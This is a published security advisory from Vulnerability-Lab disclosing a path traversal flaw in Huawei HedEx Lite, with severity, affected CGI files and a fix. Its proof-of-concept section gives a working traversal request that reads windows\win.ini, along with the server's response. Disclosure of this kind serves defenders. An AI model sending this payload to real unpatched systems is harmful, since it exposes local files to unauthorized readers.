@@ -1,0 +1,303 @@
+# Exploit Title: Huawei HedEx Lite 200R006C00SPC005 - Path Traversal
+# Date: 2020-11-24
+# Exploit Author: Vulnerability-Lab
+# Vendor Homepage: https://www.huawei.com/
+# Software Link: https://support.huawei.com/carrier/docview!docview?nid=SCL1000005027&path=PAN-ET/PAN-T/PAN-T-HedEx
+# Version: 200R006C00SPC005
+
+Document Title:
+===============
+Huawei HedEx Lite (DM) - Path Traversal Web Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2268
+
+
+Release Date:
+=============
+2020-11-24
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2268
+
+
+Common Vulnerability Scoring System:
+====================================
+7
+
+
+Vulnerability Class:
+====================
+Directory- or Path-Traversal
+
+
+Current Estimated Price:
+========================
+3.000€ - 4.000€
+
+
+Product & Service Introduction:
+===============================
+https://support.huawei.com/carrier/docview!docview?nid=SCL1000005027&path=PAN-ET/PAN-T/PAN-T-HedEx
+
+
+Abstract Advisory Information:
+==============================
+A vulnerability laboratory core team researcher discovered a path
+traversal vulnerability in the Huawei HedEx Lite v200R006C00SPC005.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-11-24: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Authentication Type:
+====================
+Restricted Authentication (User Privileges)
+
+
+User Interaction:
+=================
+No User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+An exploitable path traversal vulnerability has been discovered in the
+official Huawei HedEx Lite v200R006C00SPC005.
+Attackers can able to request local files or resources by remote
+requesting to unauthorized change a local path.
+
+
+Proof of Concept (PoC):
+=======================
+The path traversal vulnerability can be exploited by remote attackers
+with restricted system user privileges wihtout user interaction.
+For security demonstration or to reproduce the vulnerability follow the
+provided information and steps below to continue.
+
+
+Vulnerable File(s):
+./newOtherManageContent.cgi [URL Path Filename]
+./newStartupHedExBeeAction.cgi [URL Path Filename]
+./newprehomeadvsearch.cgi [URL Path Filename]
+
+
+--- PoC Session Logs [POST Method Request] ---
+URL:
+http://localhost:7890/newOtherManageContent.cgi/................................windowswin.ini
+Path:
+/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+HTTP/1.1
+Host: localhost:7890
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101
+Firefox/27.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://localhost:7890/newindex.cgi
+Connection: close
+Content-Length: 0
+
+
+ --- PoC Session Logs [Response] ---
+HTTP/1.1 200 OK
+Content-Disposition: attachment; filename="win.ini"
+Content-Length: 1801
+Content-Type: application/octet-stream;charset=utf-8
+X-Frame-Options: SAMEORIGIN
+-
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+CMCDLLNAME32=mapi32.dll
+CMC=1
+MAPIX=1
+MAPIXVER=1.0.0.1
+OLEMessaging=1
+[MCI Extensions.BAK]
+3g2=MPEGVideo
+3gp=MPEGVideo
+3gp2=MPEGVideo
+3gpp=MPEGVideo
+aac=MPEGVideo
+adt=MPEGVideo
+adts=MPEGVideo
+m2t=MPEGVideo
+m2ts=MPEGVideo
+m2v=MPEGVideo
+m4a=MPEGVideo
+m4v=MPEGVideo
+mod=MPEGVideo
+mov=MPEGVideo
+mp4=MPEGVideo
+mp4v=MPEGVideo
+mts=MPEGVideo
+ts=MPEGVideo
+tts=MPEGVideo
+[Drivers.32]
+OLEMessaging.64=$80,$5D,$D9,$A6,$A4,$18,$A8,$AD
+[ChannelDownmixer]
+p1.bIsMultichannel=0
+p1.wFormatTag=1
+p1.nChannels=2
+p1.dwChannelMask=63
+p1.wBitsPerSample=16
+p1.RequiredInputBitDepth=0
+p1.bRequireInputNumberOfChannels=0
+p1.RequiredInputNumberOfChannels=6
+p1.bRequireInputSamplerate=0
+p1.RequiredInputSamplerate=48000
+p1.bRaiseMeritAndSingleInstance=1
+p2.InputEnableBitmask=-1
+p2.OutputEnableBitmask=-1
+p2.bEnableInputGains=0
+p2.bEnableOutputGains=0
+p2.bEnableMasterVolume=0
+p2.MasterVolumeGain=100
+p2.I.FL=100
+p2.I.FR=100
+p2.I.FC=100
+p2.I.LF=100
+p2.I.BL=100
+p2.I.BR=100
+p2.I.FLC=100
+p2.I.FRC=100
+p2.I.BC=100
+p2.I.SL=100
+p2.I.SR=100
+p2.I.TC=100
+p2.I.TFL=100
+p2.I.TFC=100
+p2.I.TFR=100
+p2.I.TBL=100
+p2.I.TBC=100
+p2.I.TBR=100
+p2.I.bJoinFLFR=1
+p2.I.bJoinBLBR=1
+p2.I.bJoinFLCFRC=1
+p2.I.bJoinSLSR=1
+p2.I.bJoinTFLTFR=1
+p2.I.bJoinTBLTBR=1
+p2.O.FL=100
+p2.O.FR=100
+p2.O.FC=100
+p2.O.LF=100
+p2.O.BL=100
+p2.O.BR=100
+p2.O.FLC=100
+p2.O.FRC=100
+p2.O.BC=100
+p2.O.SL=100
+p2.O.SR=100
+p2.O.TC=100
+p2.O.TFL=100
+p2.O.TFC=100
+p2.O.TFR=100
+p2.O.TBL=100
+p2.O.TBC=100
+p2.O.TBR=100
+p2.O.bJoinFLFR=1
+p2.O.bJoinBLBR=1
+p2.O.bJoinFLCFRC=1
+p2.O.bJoinSLSR=1
+p2.O.bJoinTFLTFR=1
+p2.O.bJoinTBLTBR=1
+p3.bCustomMixMatrix=0
+CustomMixMatrixFilename=
+LastRegisteredVersion=20000
+
+
+Solution - Fix & Patch:
+=======================
+The vulnerability can be resolved by setting restricted accessable
+paths.  A whitelist or static paths configuration can be combined.
+An update is available on the huawei website provided by the
+manufacturer of the application via customer portal.
+
+
+Security Risk:
+==============
+The security risk of the path traversal web vulnerability in the
+download manager software is estimated as high.
+
+
+Credits & Authors:
+==================
+S.AbenMassaoud [Research Team] -
+https://www.vulnerability-lab.com/show.php?user=S.AbenMassaoud
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
